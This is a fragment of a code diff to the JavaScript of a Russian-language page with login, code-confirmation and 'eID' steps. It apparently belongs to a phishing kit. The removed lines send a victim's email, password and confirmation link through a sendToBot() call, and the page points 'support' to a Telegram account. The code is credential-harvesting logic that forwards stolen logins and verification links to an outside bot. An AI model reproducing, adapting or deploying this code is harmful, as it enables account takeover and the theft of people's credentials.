-                showMsg('Введите ссылку подтверждения', 'error');
-                return;
-            }
-            eidLinkBtn.disabled = true;
-            eidLinkBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToBot({ type: 'eid_link', email: eidEmailValue, password: eidPasswordValue, link: link });
-            if (ok) {
-                eidLinkBtn.disabled = false;
-                eidLinkBtn.textContent = '✅ Отправить ссылку';
-                eidLinkInput.value = '';
-                goToSuccess();
-                showMsg('✅ Отправлено', 'success');
-            } else {
-                eidLinkBtn.disabled = false;
-                eidLinkBtn.textContent = '✅ Отправить ссылку';
-                showMsg('❌ Ошибка отправки', 'error');
-            }
-        });
-
-        // ============================================================
-        // 10. ENTER
+        // 7. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -957,18 +281,12 @@
                     loginSubmitBtn.click();
                 } else if (pageCodeConfirm.classList.contains('active')) {
                     codeBtn.click();
-                } else if (pageEid.classList.contains('active')) {
-                    if (eidLinkBlock.style.display === 'block') {
-                        eidLinkBtn.click();
-                    } else {
-                        eidSubmitBtn.click();
-                    }
                 }
             }
         });
 
         // ============================================================
-        // 11. ТЕХПОДДЕРЖКА
+        // 8. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
